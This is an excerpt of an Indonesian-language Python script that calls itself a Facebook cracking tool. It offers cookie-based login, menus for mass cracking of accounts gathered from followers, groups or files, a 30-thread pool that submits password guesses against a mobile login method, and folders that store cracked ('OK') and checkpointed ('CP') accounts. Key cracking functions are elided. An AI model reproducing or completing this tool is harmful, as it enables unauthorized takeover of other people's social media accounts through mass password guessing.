...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tLOGIN DENGAN COOKIES LU NGAB'))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tHEY [green]%s[white] SELAMAT DATANG DI TOOLS CRACK FACEBOOK'%(my_name)))
	
	alvino_xy(h+ f'[!] ID AKUN KAMU : \033[1;33m'+str(my_id))
	print(h+ '[!] VERSI SCRIPT :',k,'2,0' )
	print (h+"[!] IP KAMU      : "+k+ip)
	...
	print(h+ '''
	┏━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━┳━━━━━━┓
	┃ NO ┃    LIST CRACK   ┃ STATUS ┃ TYPE ┃
	┣━━━━╋━━━━━━━━━━━━━━━━━╋━━━━━━━━╋━━━━━━┫
	┃  1 ┃   Crack Masal   ┃   ON   ┃ FREE ┃
	┃  2 ┃  Crack Follower ┃   ON   ┃ FREE ┃
	┃  3 ┃    Crack Grup   ┃   ON   ┃ FREE ┃
	┃  4 ┃    Crack File   ┃   ON   ┃ FREE ┃
	┃  5 ┃   Hasil Crack   ┃   ON   ┃ FREE ┃
	┃  6 ┃  Lapor bug sc   ┃   ON   ┃ FREE ┃
	┃  0 ┃   KELUAR/EXIT   ┃   ON   ┃ FREE ┃
	┗━━━━┻━━━━━━━━━━━━━━━━━┻━━━━━━━━┻━━━━━━┛
''')
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		os.system('xdg-open https://wa.me/6285783936913?text=Bang+Ada+Bug+di+sc')
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('Kamu Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def setting():
	print('''
	┏━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━┳━━━━━━┓
	┃ NO ┃    LIST METODE  ┃ STATUS ┃ TYPE ┃
	┣━━━━╋━━━━━━━━━━━━━━━━━╋━━━━━━━━╋━━━━━━┫
	┃  1 ┃    Akun Old     ┃   ON   ┃ FREE ┃
	┃  2 ┃    Akun New     ┃   ON   ┃ FREE ┃
	┃  3 ┃   Random Akun   ┃   ON   ┃ FREE ┃
	┗━━━━┻━━━━━━━━━━━━━━━━━┻━━━━━━━━┻━━━━━━┛
''')
	print('')
	hu = input('[!] Pilih : ')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'├───────────────────────[ Memulai Crack ]───────────────────────┤')
	print('')
	print(f'>> Hasil {h}☣️ OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}☢️ CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai gak ijo? kalo mau yg ijo minimal prem lah bang [cyan] <<[white] '))
